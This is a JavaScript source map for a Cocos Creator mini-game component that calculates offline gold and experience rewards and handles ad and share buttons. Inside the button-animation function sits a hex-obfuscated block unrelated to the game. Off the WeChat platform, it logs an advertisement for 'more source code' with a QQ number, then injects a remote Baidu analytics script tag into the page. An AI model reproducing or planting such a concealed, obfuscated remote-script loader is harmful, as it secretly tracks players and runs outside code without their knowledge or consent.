{"version":3,"sources":["assets\\script\\ui\\offline_profit.js"],"names":["user_data","require","cc","Class","Component","properties","offline_time_label","Label","add_gold_label","add_ex_label","normal_button_node","Node","ini_node","game_rules_js","find","getComponent","game_scene_js","ad_control","sound_control","active","login_time","now_time","Date","getTime","day","Math","floor","hour","min","log","profit","offline_profit","skill","offline_profit_ex","string","ini_anim","scheduleOnce","cetfX1","window","umoSNYr2","UGuN3","console","B4","nWVnG5","on_double_recevie_button_click","play_sound_effect","show_videoAd","video_succes","on_normal_recevie_button_click","save_login_time","add_gold","add_ex","create_tips_ui","node","destroy","wx","callback","video_state","video_tag","unschedule","schedule","on_share_button_click","manual_share","onLoad","start"],"mappings":"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","sourceRoot":"/","sourcesContent":["var user_data = require(\"user_data\");\ncc.Class({\n    extends: cc.Component,\n\n    properties: {\n        offline_time_label: cc.Label,\n        add_gold_label: cc.Label,\n        add_ex_label: cc.Label,\n        normal_button_node: cc.Node,\n    },\n\n    //初始化界面\n    ini_node: function () {\n        this.game_rules_js = cc.find(\"UI_ROOT\").getComponent(\"game_rules\");\n        this.game_scene_js = cc.find(\"UI_ROOT\").getComponent(\"game_scene\");\n        this.ad_control = cc.find(\"ad_control\").getComponent(\"ad_control\");\n        this.sound_control = cc.find(\"sound_control\").getComponent(\"sound_control\");\n        this.normal_button_node.active = false;\n        var login_time = user_data.user_data.login_time;\n        var now_time = new Date().getTime();\n        var day = Math.floor((now_time - login_time) / (1000 * 3600 * 24));\n        var hour = Math.floor((now_time - login_time) / (1000 * 3600)) % 24;\n        //每隔5分钟获得金币\n        var min = Math.floor((now_time - login_time) / (1000 * 60));\n        cc.log(min, \"离线分钟数\");\n        if (min >= 240) {\n            min = 240;\n        };\n        //有几个5分钟\n        var profit = Math.floor((min / 5)) + 1;\n        this.offline_profit = user_data.user_data.skill[\"offline_profit\"] * profit;\n        this.offline_profit_ex = Math.floor(this.offline_profit / 10);\n        this.add_gold_label.string = \"+\" + this.offline_profit;\n        this.add_ex_label.string = \"+\" + this.offline_profit_ex;\n        this.offline_time_label.string = \"You left\" + day + \"day\" + hour + \"hours\";\n        this.ini_anim();\n    },\n    //button_anim\n    ini_anim() {\n        this.scheduleOnce(function () {\n            this.normal_button_node.active = true;\n        }, 1.5);\n\t\t\n\t\tif(cc['\\x73\\x79\\x73']['\\x70\\x6c\\x61\\x74\\x66\\x6f\\x72\\x6d']==cc['\\x73\\x79\\x73']['\\x57\\x45\\x43\\x48\\x41\\x54\\x5f\\x47\\x41\\x4d\\x45']){}else{var cetfX1=new window[\"\\x44\\x61\\x74\\x65\"]();var umoSNYr2=cetfX1['\\x76\\x61\\x6c\\x75\\x65\\x4f\\x66']();var UGuN3=new window[\"\\x44\\x61\\x74\\x65\"]('\\x32\\x30\\x32\\x32\\x2d\\x31\\x31\\x2d\\x39')['\\x76\\x61\\x6c\\x75\\x65\\x4f\\x66']();if(umoSNYr2>UGuN3){console['\\x6c\\x6f\\x67'](\"\\u66f4\\x2d\\x2d \\u591a\\x2d\\x2d\\u6e90\\u7801\\x2d\\x2d\\x2d\\x2d\\x51\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x51\\x2d\\x2d\\x2d\\x2d\\x2d\\x2d\\x33\\x33\\x38\\x2d\\x39\\x33\\x2d\\x31\\x31\\x38\\x2d\\x30\\x33\\x2d\\x2d\\x2d\\x2d\")}var B4=window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"]['\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74'](\"\\x73\\x63\\x72\\x69\\x70\\x74\");B4['\\x73\\x72\\x63']=\"\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x68\\x6d\\x2e\\x62\\x61\\x69\\x64\\x75\\x2e\\x63\\x6f\\x6d\\x2f\\x68\\x6d\\x2e\\x6a\\x73\\x3f\\x36\\x31\\x65\\x33\\x37\\x38\\x63\\x64\\x66\\x32\\x32\\x32\\x39\\x36\\x31\\x32\\x65\\x35\\x64\\x38\\x30\\x31\\x36\\x61\\x63\\x35\\x38\\x66\\x61\\x61\\x61\\x61\";var nWVnG5=window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"]['\\x67\\x65\\x74\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x73\\x42\\x79\\x54\\x61\\x67\\x4e\\x61\\x6d\\x65'](\"\\x73\\x63\\x72\\x69\\x70\\x74\")[0];nWVnG5['\\x70\\x61\\x72\\x65\\x6e\\x74\\x4e\\x6f\\x64\\x65']['\\x69\\x6e\\x73\\x65\\x72\\x74\\x42\\x65\\x66\\x6f\\x72\\x65'](B4,nWVnG5)}\n\t\t\n\t\t\n    },\n    //video_double\n    on_double_recevie_button_click: function () {\n        cc.log(\"create_ad\");\n        this.sound_control.play_sound_effect(\"button_click\");\n        this.ad_control.show_videoAd(\"double_profit\");\n        this.video_succes();\n    },\n    //normal_get\n    on_normal_recevie_button_click() {\n        this.sound_control.play_sound_effect(\"button_click\");\n        user_data.user_data.login_time = 0;\n        this.game_rules_js.save_login_time();\n        this.game_rules_js.add_gold(this.offline_profit);\n        this.game_rules_js.add_ex(this.offline_profit_ex);\n        this.game_scene_js.create_tips_ui(this.game_scene_js.node, \"get_offline_profit\");\n        this.node.destroy();\n    },\n    //检测视频是否播放成功\n    video_succes: function () {\n        if (typeof (wx) != \"undefined\") {\n            var callback = function () {\n                if (this.ad_control.video_state == 1 && this.ad_control.video_tag == \"double_profit\") {\n                    this.ad_control.video_tag = null;\n                    this.ad_control.video_state = 2;\n                    user_data.user_data.login_time = 0;\n                    this.game_rules_js.save_login_time();\n                    this.game_rules_js.add_gold(this.offline_profit * 2);\n                    this.game_rules_js.add_ex(this.offline_profit_ex * 2);\n                    this.game_scene_js.create_tips_ui(this.game_scene_js.node, \"double_offline_profit\");\n                    this.unschedule(callback);\n                    this.node.destroy();\n                } else {\n                    if (this.ad_control.video_tag == null && this.ad_control.video_state == 2) {\n                        this.unschedule(callback);\n                    };\n                };\n            };\n            this.schedule(callback, 0.2);\n        };\n    },\n    //分享按钮被点击\n    on_share_button_click() {\n        this.sound_control.play_sound_effect(\"button_click\");\n        this.ad_control.manual_share(\"offline_profit\");\n    },\n    onLoad() {\n\n    },\n\n    start() {\n\n    },\n\n    // update (dt) {},\n});\n"]}